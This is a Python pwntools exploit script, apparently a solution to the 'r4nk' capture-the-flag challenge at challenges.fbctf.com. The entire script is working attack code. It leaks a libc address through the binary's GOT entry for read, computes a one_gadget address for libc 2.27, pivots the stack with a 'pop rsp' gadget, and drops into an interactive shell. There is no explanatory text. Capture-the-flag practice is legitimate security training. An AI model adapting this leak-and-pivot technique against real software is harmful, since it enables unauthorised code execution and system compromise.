from pwn import *

bin = ELF('./r4nk')
libc = ELF('./libc-2.27.so', checksec=False)

LOCAL = False

one_gadget_offset = [0x4f2c5, 0x4f322, 0x10a38c]

# context.log_level = 'debug'


def rank(title, rank):
    conn.sendlineafter('>', str(2))
    conn.sendlineafter('>', str(title))
    conn.sendlineafter('>', str(rank))


if LOCAL:
    conn = process('./r4nk', env={'LD_PRELOAD': './libc-2.27.so'})
    # gdb.attach(conn, 'b * 0x400acd')
else:
    conn = remote('challenges.fbctf.com', 1339)

conn.sendlineafter('>', str(1) + 'XXXXXXX' + p64(bin.got['read']))
rank(0, 17)
conn.sendlineafter('>', str(1) + 'XXXXXXX' + p64(bin.got['read']))
conn.recvuntil('0. ')
libc_addr = u64(conn.recv(6)+'\x00\x00') - libc.symbols['read']

log.info('Libc addr: ' + hex(libc_addr))
log.info('One gadget addr: ' + hex(libc_addr + one_gadget_offset[1]))

conn.sendlineafter('>', str(2) + 'XXXXXXXYYYYYYYYZZZZZZZZ' +
                   p64(libc_addr + one_gadget_offset[1]))
conn.sendlineafter('>', str(17))
conn.sendlineafter('>', str(0x400980))  # pop rsp; pop r13; ret
rank(18, 0x602110)

conn.sendlineafter('>', str(3))

conn.interactive()
